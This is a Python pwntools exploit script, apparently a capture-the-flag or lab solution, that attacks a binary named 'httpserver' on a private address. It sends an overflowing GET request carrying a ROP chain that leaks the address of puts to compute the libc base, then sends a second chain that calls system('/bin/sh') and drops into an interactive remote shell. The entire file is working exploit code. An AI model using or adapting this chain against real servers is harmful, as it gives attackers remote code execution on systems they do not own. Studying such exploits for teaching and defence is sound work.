#!/usr/bin/env python3
from pwn import *

HOST = '172.17.0.3'
PORT = 80

elf = context.binary = ELF("./httpserver")
rop = ROP(elf)

if args.REMOTE:
    libc = ELF("./libc-2.28.so")
else:
    libc = ELF("/lib/libc.so.6")

print(libc.path)

gs = '''
continue
'''

# For GDB debugging
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)

p = start()

log.info(f"PUTS GOT {hex(elf.got.puts)}")

padding = b"GET "
padding += b"aaa\x00"
padding += b"A" * (cyclic_find(0x6161616962616161, n=8) - 4)

rop.raw(padding)
rop.call('puts', [elf.got['puts']])
rop.call('main')

log.info(rop.dump())

p.sendline(rop.chain())

PUTS = unpack(p.recvlines(4)[-1], 'all')
log.info(f"PUTS: {hex(PUTS)}")

libc.address = PUTS - libc.sym['puts']
log.info(f"LIBC base: {hex(libc.address)}")

rop = ROP([elf, libc])

padding = b"GET "
padding += b"aaa\x00"
padding += b"A" * (cyclic_find(0x6161616962616161, n=8) - 4)

rop.raw(padding)
rop.raw(rop.ret.address)
rop.call('system', [next(libc.search(b"/bin/sh\x00"))])
rop.call('exit', [0])

log.info(rop.dump())

p.sendline(rop.chain())

p.clean()
log.success('Enjoy your shell :)')
p.interactive()
